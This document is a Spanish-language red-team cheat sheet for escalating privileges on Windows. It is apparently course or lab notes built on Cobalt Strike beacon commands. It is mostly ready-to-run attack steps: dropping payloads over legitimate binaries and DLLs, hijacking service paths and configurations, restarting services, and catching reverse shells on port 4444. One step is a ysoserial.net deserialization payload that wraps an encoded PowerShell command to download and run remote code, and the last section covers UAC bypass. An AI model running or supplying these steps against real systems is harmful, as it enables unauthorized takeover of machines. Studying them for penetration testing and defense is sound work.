### 🔹 **1. PATH Environment Variable Hijack**

**Qué es:**  
Si una carpeta _antes que System32_ en `PATH` es _escribible_, puedes colocar un binario malicioso con el mismo nombre que uno legítimo (ej: `timeout.exe`).

**Uso:** Si puedes escribir en un directorio listado en el PATH antes de `C:\Windows\System32`.

**Comandos clave:**

```powershell
beacon>powershell Get-Item Env:Path # Ver variables de entorno, buscar rutas delante del path, sin o se ve entero:
beacon> env (buscamos Path=)
beacon> cacls <dir>    # Ver permisos del directorio, si peudo escribir.
beacon> cd <dir_writable>           
beacon> upload <payload>            
beacon> mv <payload> <nombre_legítimo>.exe
```

**Ejemplo práctico:**

```powershell
beacon> cd C:\Python313\Scripts
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe timeout.exe
```



🔹 **2. Search Order Hijacking**

**Qué es:**  
Hijack del orden de búsqueda al ejecutar binarios (varía según la API usada: `CreateProcess`, `ShellExecuteEx`, `WinExec`).

**Orden de búsqueda típico (WinExec):**

1. Dir ejecutable
    
2. Dir actual
    
3. `C:\Windows\System32`
    
4. `C:\Windows`
    
5. PATH

**Claves:**
- Si el ejecutable está en un directorio escribible, puedes suplantar `cmd.exe`, etc.

**Uso:** Si puedes escribir en el directorio donde vive el binario del servicio/aplicación.

**Comandos:**
```powershell
beacon> cacls "C:\Ruta\Del\Binario"
beacon> cd "C:\Ruta\Del\Binario"
beacon> upload <payload>
beacon> mv <payload> cmd.exe
```

**Ejemplo:**
```powershell
beacon> cd "C:\Program Files\Bad Windows Service\Service Executable"
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe cmd.exe
```


### 🔹 **3. Unquoted Service Path Hijacking**

**Qué es:**  
Servicios que se configuran con rutas que contienen espacios y no están entre comillas. Windows busca de forma ambigua (`C:\Program Files\Bad.exe`, etc.).

**Buscar rutas sin comillas:**

```powershell
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
beacon> cd C:\Program Files\Vulnerable Services
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> run sc stop VulnService1
beacon> run sc start VulnService1
beacon> connect localhost 4444
```


### 🔹 **4. Servie Permisions**

#### 💥 Requisitos
- Permiso de **modificación sobre la configuración** del servicio (`sc config`).
- El binario no necesita ser vulnerable, solo la configuración

```powershell
# 1. Enumerar servicios modificables
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. Ver permisos exactos
beacon> powershell-import Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

# 3. Ver configuración actual
beacon> run sc qc VulnService2

# 4. Subir payload
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload tcp-local_x64.svc.exe

# 5. Cambiar ruta del binario
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

# 6. Reiniciar servicio
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

# 7. Conectarse al reverse shell
beacon> connect localhost 4444
```

### 🔹 **5. Weak Service Binary Permission**

#### 💥 Requisitos
- Permisos de escritura sobre el **binario del servicio**.
```powershell
# 1. Enumerar servicios modificables
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. Ver permisos sobre el binario
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

# 3. Copiar payload con el nombre del binario
PS> copy "tcp-local_x64.svc.exe" "Service 3.exe"

# 4. Parar servicio
beacon> run sc stop VulnService3

# 5. Subir binario modificado
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload Service 3.exe

# 6. Iniciar servicio
beacon> run sc start VulnService3

# 7. Conectarse al reverse shell
beacon> connect localhost 4444
```


### 🔹 **6.  Escalada por DLL Search Order Hijacking**
### 🔍 ¿Qué es?

Cuando una app necesita una DLL, muchas veces no indica su ruta completa, sino solo el nombre. Entonces **Windows busca esa DLL en un orden específico** llamado “DLL search order”.

👉 Si tú puedes **escribir un archivo malicioso en una carpeta que se revisa antes que la legítima**, puedes engañar a la app para que cargue tu DLL maliciosa con privilegios altos.

---

### 📚 **Orden típico de búsqueda de DLLs en Windows**:

1. 📁 Directorio desde el que se ejecuta el programa
    
2. 📁 `C:\Windows\System32`
    
3. 📁 `C:\Windows\System`
    
4. 📁 `C:\Windows`
    
5. 📁 **Directorio de trabajo actual**
    
6. 📁 Directorios del `PATH` (variable de entorno)

```powershell
# 1. Ver si el ejecutable llama a una DLL sin ruta (típico en apps mal hechas)
→ Ya confirmado que busca "BadDll.dll" sin ruta

# 2. Ver el directorio donde se ejecuta el servicio
beacon> ls "C:\Program Files\Bad Windows Service\Service Executable"

# 3. Ver si ese directorio es escribible
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
# Si ves: Authenticated Users:(CI)(OI)F → TIENES PERMISOS PARA ESCRIBIR 🟢

# 4. Subir DLL maliciosa
beacon> cd "C:\Program Files\Bad Windows Service\Service Executable"
beacon> upload C:\Payloads\dns_x64.dll

# 5. Renombrar a la DLL que busca la app
beacon> mv dns_x64.dll BadDll.dll

# 6. Esperar a que se ejecute el servicio o reiniciarlo si puedes
beacon> run sc stop BadWindowsService
beacon> run sc start BadWindowsService

# 7. Ya tienes shell con los privilegios del servicio 😈
beacon> connect localhost 4444 (o lo que hayas definido)
```



### 🔹 **7.  Escalada por Vulnerabilidad de Deserialización**

Muchos programas guardan objetos en archivos binarios. Para volver a usarlos, **deserializan** esos archivos. El problema aparece cuando el programa:

- Deserializa datos desde una **ruta que puedes controlar** (como `C:\Temp\data.bin`)
- Usa una técnica vulnerable como `BinaryFormatter`
- **Corre con privilegios elevados** (ej: SYSTEM, admin)

👉 En ese caso, puedes **escribir un archivo malicioso** que, al ser deserializado, ejecute **tu código como SYSTEM**. 🔥

```powershell
#BUSCAR BINARIOS QUE DESERIALIZEN
Get-ChildItem -Path C:\ -Recurse -Include *.bin,*.dat,*.txt -ErrorAction SilentlyContinue -Force |
Where-Object { 
    -not $_.PSIsContainer -and 
    (Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -SimpleMatch "deserialise") 
} |
Select-Object FullName
```

- Si tú puedes **escribir en la ruta del binario** y ese programa corre con permisos elevados… ¡es tu oportunidad!

```powershell
C:\Tools\ysoserial.net\ysoserial.exe ^
  -g TypeConfuseDelegate ^
  -f BinaryFormatter ^
  -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" ^
  -o raw ^
  --outputpath C:\Payloads\data.bin


beacon> cd C:\Temp
beacon> upload C:\Payloads\data.bin
```



### 🔹 **8.  UAC Bypass**

### 🔍 Ver tu nivel de integridad:

```powershell
beacon>whoami /groups
```
→ Verás una línea como: `Mandatory Label\Medium Mandatory Level`

- Escalar
```powershell
beacon> elevate [exploit] [listener]
#Ejemplo:
beacon> elevate uac-token-duplication http_listener
```
### `runasadmin` – Ejecuta comandos con elevación

```powershell
runasadmin uac-schtasks cmd.exe /c whoami /groups
```
